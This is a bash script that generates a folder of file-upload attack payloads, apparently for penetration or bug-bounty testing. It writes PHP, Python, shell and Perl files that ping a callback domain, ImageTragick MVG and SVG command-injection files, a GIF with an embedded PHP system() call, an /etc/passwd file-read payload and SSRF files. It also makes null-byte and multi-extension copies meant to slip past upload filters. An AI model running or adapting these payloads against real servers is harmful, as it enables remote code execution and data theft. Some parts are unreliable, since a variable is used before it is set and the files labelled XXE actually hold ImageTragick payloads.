#!/bin/bash

DATE=$(date +"%d-%b-%Y")

# https://convertcase.net/
FORMAT=( php js py pyc htm html phps phpt php3 php4 php5 svg jpg jpeg png tiff tif gif eps raw psd xcf cdr ai bmp cr2 nef orf sr2 psp c class cs c#  dtd fla h java lua m pl py sln swift vb vcxproj xcodeproj ini bat bmp js exe bin cgi com jar wsf cab dll ico sys cfg cue iso dmg asp aspx cer cfm crdownload csr css dcr htm html js jsp php rss xhtml xml tar zip zipx gz 7z bz2 rar tgz xz txt doc docx pdf xls xlsx csv ppt pptx ods odt rtf tex wav mp3 mp4 mpa wma mid avi flv mov mpg vob wmv sql db msg pem ttf otf fnt bak tmp PHP JS PY PYC HTM HTML PHPS PHPT PHP3 PHP4 PHP5 SVG JPG JPEG PNG TIFF TIF GIF EPS RAW PSD XCF CDR AI BMP CR2 NEF ORF SR2 PSP C CLASS CPP CS C#  DTD FLA H JAVA LUA M PL PY SH SLN SWIFT VB VCXPROJ XCODEPROJ INI SH BAT BMP JS EXE BIN CGI COM JAR WSF CAB DLL ICO SYS CFG CUE ISO DMG ASP ASPX CER CFM CSR CSS DCR HTM HTML JS JSP PHP RSS XHTML XML TAR ZIP ZIPX GZ 7Z BZ2 RAR TGZ XZ TXT DOC DOCX PDF XLS XLSX CSV PPT PPTX ODS ODT RTF TEX WAV MP3 MP4 MPA WMA MID AVI FLV MOV MPG VOB WMV SQL DB MSG PEM TTF OTF FNT BAK TMP Php Js Py Pyc Htm Html Phps Phpt Php3 Php4 Php5 Svg Jpg Jpeg Png Tiff Tif Gif Eps Raw Psd Xcf Cdr Ai Bmp Cr2 Nef Orf Sr2 Psp C Class Cpp Cs C#  Dtd Fla H Java Lua M Pl Py Sh Sln Swift Vb Vcxproj Xcodeproj Ini Sh Bat Bmp Js Exe Bin Cgi Com Jar Wsf Cab Dll Ico Sys Cfg Cue Iso Dmg Asp Aspx Cer Cfm Crdownload Csr Css Dcr Htm Html Js Jsp Php Rss Xhtml Xml Tar Zip Zipx Gz 7z Bz2 Rar Tgz Xz Txt Doc Docx Pdf Xls Xlsx Csv Ppt Pptx Ods Odt Rtf Tex Wav Mp3 Mp4 Mpa Wma Mid Avi Flv Mov Mpg Vob Wmv Sql Db Msg Pem Ttf Otf Fnt Bak Tmp pHp jS Py pYc hTm hTmL PhPs pHpT PhP3 pHp4 PhP5 sVg jPg jPeG PnG TiFf tIf gIf ePs rAw pSd xCf cDr aI BmP Cr2 NeF OrF Sr2 PsP C ClAsS CpP Cs c#  dTd fLa h jAvA LuA M Pl pY Sh sLn sWiFt vB VcXpRoJ XcOdEpRoJ InI Sh bAt bMp jS ExE BiN CgI CoM JaR WsF CaB DlL IcO SyS CfG CuE IsO DmG AsP AsPx cEr cFm cRdOwNlOaD CsR CsS DcR HtM HtMl jS JsP PhP RsS XhTmL XmL TaR ZiP ZiPx gZ 7z bZ2 rAr tGz xZ TxT DoC DoCx pDf xLs xLsX CsV PpT PpTx oDs oDt rTf tEx wAv mP3 mP4 mPa wMa mId aVi fLv mOv mPg vOb wMv sQl dB MsG PeM TtF OtF FnT BaK TmP Php Js Py Pyc Htm Html Phps Phpt Php3 Php4 Php5 Svg Jpg Jpeg Png Tiff Tif Gif Eps Raw Psd Xcf Cdr Ai Bmp Cr2 Nef Orf Sr2 Psp C Class Cpp Cs C#  Dtd Fla H Java Lua M Pl Py Sh Sln Swift Vb Vcxproj Xcodeproj Ini Sh Bat Bmp Js Exe Bin Cgi Com Jar Wsf Cab Dll Ico Sys Cfg Cue Iso Dmg Asp Aspx Cer Cfm Crdownload Csr Css Dcr Htm Html Js Jsp Php Rss Xhtml Xml Tar Zip Zipx Gz 7z Bz2 Rar Tgz Xz Txt Doc Docx Pdf Xls Xlsx Csv Ppt Pptx Ods Odt Rtf Tex Wav Mp3 Mp4 Mpa Wma Mid Avi Flv Mov Mpg Vob Wmv Sql Db Msg Pem Ttf Otf Fnt Bak Tmp pHP jS pY pYC hTM hTML pHPS pHPT pHP3 pHP4 pHP5 sVG jPG jPEG pNG tIFF tIF gIF ePS rAW pSD xCF cDR aI bMP cR2 nEF oRF sR2 pSP c cLASS cPP cS c#  dTD fLA h jAVA lUA m pL pY sH sLN sWIFT vB vCXPROJ xCODEPROJ iNI sH bAT bMP jS eXE bIN cGI cOM jAR wSF cAB dLL iCO sYS cFG cUE iSO dMG aSP aSPX cER cFM cRDOWNLOAD cSR cSS dCR hTM hTML jS jSP pHP rSS xHTML xML tAR zIP zIPX gZ 7Z bZ2 rAR tGZ xZ tXT dOC dOCX pDF xLS xLSX cSV pPT pPTX oDS oDT rTF tEX wAV mP3 mP4 mPA wMA mID aVI fLV mOV mPG vOB wMV sQL dB mSG pEM tTF oTF fNT bAK tMP )

EXTRACHAR=( .. -- - _ = + ~ [ ] * ^ % $ ? , @ %00 )

KEY64=$(echo "$NAME.$(date +'%d-%b-%Y-%T').$(echo $RANDOM)" | base64 | sed 's/=//g')


# Ask the user what they would like to name this.
echo "what would you like to name this?"
read NAME

# Ask the user what website they are making this for.
echo "what website would you like everything to ping?"
read SITE

# use variable to make folder
mkdir $NAME
mkdir $NAME/$DATE

# change directory 
cd $NAME/$DATE



# php
mkdir $NAME-php
cd $NAME-php

cat <<EOF > ping.php
<?php
system("ping -c 1 $KEY64.php.$SITE");
?>
EOF



# python
cd ..
mkdir $NAME-python
cd $NAME-python

cat <<EOF > ping.py
import os
import platform
current_os = platform.system().lower()

if current_os == "windows":
    parameter = "-n"
else:
    parameter = "-c"

os.system("ping " + parameter +" 1 -w2 $KEY64.python.$SITE")
EOF

cat <<EOF > __main__.py
import os
import platform
current_os = platform.system().lower()

if current_os == "windows":
    parameter = "-n"
else:
    parameter = "-c"

os.system("ping " + parameter +" 1 -w2 $KEY64.zippy.$SITE")
EOF

zip ping.zip __main__.py

echo '#!/usr/bin/env python' | cat - ping.zip > ping
chmod 755 ping



# shell code
cd ..
mkdir $NAME-shell
cd $NAME-shell

cat <<EOF > ping.sh
ping -c 1 $KEY64.shell.$SITE
EOF

chmod +x ping.sh




# gifs need work. these cut off the actual command after: 'https://127.0.0.1/x.php?x='

cd ..
mkdir $NAME-gif
cd $NAME-gif

cat <<EOF > wget.gif
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "https://127.0.0.1/x.php?x='wget -O- $KEY64.gif.$SITE > /dev/null'"
pop graphic-context
EOF

cat <<EOF > ping-unix.gif
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "https://127.0.0.1/x.php?x='ping -c 1 $KEY64.unixgif.$SITE'"
pop graphic-context
EOF

cat <<EOF > ping-win.gif
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "https://127.0.0.1/x.php?x='ping -n 1 $KEY64.wingif.$SITE'"
pop graphic-context
EOF



# perl
cd ..
mkdir $NAME-perl
cd $NAME-perl

cat <<EOF > ping.pl
#!/usr/bin/perl
use strict;
use warnings;
use 5.010;

use Net::Ping;
my $p = Net::Ping->new();
$p->ping('$KEY64.perl.$SITE');
$p->close; 
EOF



# gifsicle 
cd ..
mkdir $NAME-gifsicle
cd $NAME-gifsicle

wget https://gifgifmagazine.com/wp-content/uploads/2017/09/ping-pong-macke.gif

gifsicle -c "<?php system('ping -c 1 $KEY64.gifsicle.$SITE'); ?>" < ping-pong-macke.gif > gifsicle-ping.php.gif

# check to make sure the comment is correct
# gifsicle -I gifsicle-ping.php.gif

gifsicle -c '<?php echo "Current PHP version: " . phpversion(); ?>' < ping-pong-macke.gif > gifsicle-output.php.gif



# test and work on this
# ImageTragic
cd ..
mkdir $NAME-ImageTragic
cd $NAME-ImageTragic

# exploit.mvg
cat <<EOF > exploit.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url($KEY64.ImageTragic.MVG.$SITE/image.jpg"|ping -c 1 $KEY64.ImageTragic.MVG.$SITE)'
pop graphic-context
EOF

# exploit2.mvg
cat <<EOF > exploit2.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg";|ls "-la)'
pop graphic-context
EOF

# exploit.svg
cat <<EOF > exploit.svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="$KEY64.ImageTragic.SVG.$SITE/image.jpg|ping -c 1 $KEY64.ImageTragic.SVG.$SITE" x="0" y="0" height="640px" width="480px"/>
</svg>
EOF

# test with:
# convert exploit.mvg out.png

# exploit2.svg
cat <<EOF > exploit2.svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd";>
<svg width="640px" height="480px" version="1.1" xmlns="http://www.w3.org/2000/svg"; xmlns:xlink="http://www.w3.org/1999/xlink";>
<image xlink:href="https://example.com/image.jpg&quot;|ls &quot;-la" x="0" y="0" height="640px" width="480px"/>
</svg>
EOF

# ssrf.mvg
cat <<EOF > ssrf.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url($KEY64.ImageTragic.SSRF-MVG.$SITE)'
pop graphic-context
EOF

# test with:
# convert ssrf.mvg out.png # makes http request to example.com

# ssrf2.mvg
cat <<EOF > ssrf2.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(http://example.com/)'
pop graphic-context
EOF

# file_read.mvg
cat <<EOF > file_read.mvg
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/passwd'
pop graphic-context
EOF



# XXE-Inkscape
cd ..
mkdir $NAME-XXE-Inkscape
cd $NAME-XXE-Inkscape

# XXE.svg
cat <<EOF > XXE.svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="$KEY64.ImageTragic.SVG.$SITE/image.jpg|ping -c 1 $KEY64.ImageTragic.SVG.$SITE" x="0" y="0" height="640px" width="480px"/>
</svg>
EOF

# XXE2.svg
cat <<EOF > XXE2.svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd";>
<svg width="640px" height="480px" version="1.1" xmlns="http://www.w3.org/2000/svg"; xmlns:xlink="http://www.w3.org/1999/xlink";>
<image xlink:href="https://example.com/image.jpg&quot;|ls &quot;-la" x="0" y="0" height="640px" width="480px"/>
</svg>
EOF

inkscape -e xxe-inkscape.png XXE.svg
inkscape -e xxe-inkscape2.png XXE2.svg



# for loop to copy files and add %00 at the end of everyfile for nullbyte multi extention. 
cd ..
for dir in $(ls -d */); do cd $dir; for file in $(ls); do for char in ${EXTRACHAR[@]}; do cp $file $file$char; done; done; cd .. ; done

# for loop to make files with added extentions
for dir in $(ls -d */); do cd $dir; for file in $(ls); do for format in ${FORMAT[@]}; do cp $file $file.$format; done; done; cd .. ; done



# List all information to CSV file
# cd ..
echo "Site: $NAME , Date: $DATE , Pingback: $SITE" >> ~/$NAME/payloads.csv
echo "Payload , Upload Area , Date Uploaded , Date of Response" >> ~/$NAME/payloads.csv
for dir in $(ls -d */); do cd $dir; for file in $(ls); do echo "$file ,  , $DATE" >> ~/$NAME/payloads.csv; done; cd .. ; done


